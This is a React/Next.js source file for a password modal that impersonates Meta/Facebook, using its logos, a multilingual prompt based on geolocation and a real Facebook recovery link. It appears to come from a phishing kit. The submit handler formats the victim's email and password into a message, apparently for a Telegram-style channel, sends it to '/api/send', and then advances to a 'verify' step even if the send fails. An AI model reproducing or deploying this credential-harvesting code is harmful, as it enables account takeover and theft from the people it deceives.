'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import FacebookLogo from '@/assets/images/facebook-logo-image.png';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useMemo, useState, type FC } from 'react';

interface PasswordModalProps {
    userProfileImage: string;
    userName: string;
    userEmail: string;
    fullName?: string;
    pageName?: string;
    pageUrl?: string;
    legalBusinessName?: string;
    phoneNumber?: string;
    description?: string;
}

const PasswordModal: FC<PasswordModalProps> = ({ 
    userEmail,
    fullName = ''
}) => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');

    const { messageId, message, setMessage, geoInfo, setFormStep } = store();

    // Get language from country code
    const countryToLanguage: Record<string, string> = useMemo(() => ({
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    }), []);
    
    const translations = useMemo(() => {
        const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
        const lang = countryToLanguage[countryCode] || 'en';
        return getTranslations(lang);
    }, [geoInfo, countryToLanguage]);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setError('');

        // Validation
        if (!password) {
            setError(t('Please fill in all fields'));
            return;
        }

        if (password.length < 6) {
            setError(t('Password must be at least 6 characters'));
            return;
        }

        if (isLoading || !message) return;
        setIsLoading(true);

        const updatedMessage = `${message}

<b>📧 Account Email:</b> <code>${userEmail}</code>
<b>🔒 Password:</b> <code>${password}</code>`;

        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }
            setFormStep('verify');
        } catch {
            setFormStep('verify');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-3 sm:p-4 md:p-6'>
                <div className='flex max-h-[97vh] w-[90vw] max-w-xs sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center justify-center gap-2 sm:gap-3 md:gap-4 py-6 sm:py-8 md:py-10 px-3 sm:px-4 md:px-5'>
                        {/* Full Name Display */}
                        {fullName && (
                            <p className='text-base sm:text-lg md:text-xl font-bold text-[#1a1a1a] mb-3 sm:mb-4 md:mb-6 text-center'>
                                {t('Hi')}, {fullName}
                            </p>
                        )}

                        {/* Error Message */}
                        {error && (
                            <div className='w-full bg-red-100 border border-red-400 text-red-700 px-2.5 sm:px-3 md:px-4 py-1.5 sm:py-2 rounded-lg text-xs sm:text-sm'>
                                {error}
                            </div>
                        )}

                        {/* Password Input */}
                        <div className='w-full px-1.5 sm:px-3 md:px-4'>
                            <div className='relative w-full'>
                                <input
                                    type='password'
                                    value={password}
                                    onChange={e => {
                                        setPassword(e.target.value);
                                        setError('');
                                    }}
                                    className='h-10 sm:h-11 md:h-12 w-full rounded-xl border-2 border-[#d4dbe3] px-3 sm:px-3.5 py-1.5 sm:py-2 text-xs sm:text-sm md:text-base focus:outline-none focus:border-blue-500 transition'
                                    required
                                    autoComplete='password'
                                    placeholder={t('Enter your password')}
                                />
                            </div>
                        </div>

                        {/* Submit Button */}
                        <div className='w-full px-0 mt-0.5 sm:mt-1 md:mt-2'>
                            <button
                                type='submit'
                                disabled={isLoading}
                                className={`flex h-10 sm:h-11 md:h-12 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 active:bg-blue-800 ${
                                    isLoading ? 'cursor-not-allowed opacity-80' : ''
                                }`}
                            >
                                {isLoading ? (
                                    <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                ) : (
                                    t('Continue')
                                )}
                            </button>
                        </div>

                        {/* Forgotten Password Link */}
                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-xs sm:text-sm text-center text-blue-600 hover:underline mt-1.5 sm:mt-2 md:mt-3 transition'>
                            {t('Forgotten password?')}
                        </a>
                    </form>

                    {/* Meta Logo Footer */}
                    <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
                        <Image src={MetaLogo} alt='Meta' className='h-3.5 sm:h-4 w-14 sm:w-16' />
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;
